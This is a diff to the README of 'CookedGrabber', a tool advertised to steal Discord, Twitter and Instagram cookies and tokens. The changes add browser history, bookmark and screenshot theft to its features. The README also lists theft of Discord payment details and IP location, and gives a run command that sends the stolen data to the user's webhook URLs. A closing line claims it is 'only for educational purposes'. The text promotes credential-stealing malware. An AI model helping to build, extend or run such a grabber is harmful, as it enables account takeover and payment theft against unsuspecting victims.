@@ -8,6 +8,9 @@ Discord , Twitter, Instagram cookies and token grabber.
 
 - Easy to use
 - Alls navigators compatibility
+- Browser history stealer
+- Browser bookmarks stealer
+- Take screenshot 
 - Steal discord token
 - Steal discord payment informations
 - Steal IP adress and location
@@ -46,10 +49,8 @@ py CookedGrabber.py YOUR WEBHOOK(s) URL(s)
 ```
 
 ## Coming soon features 
-- More optimisations , kill lags
 - Saved password stealer
-- Bookmarks stealer
-- History stealer
+
 - More error bypass
 ## Disclaimer
 - Only for educationnal puposes.
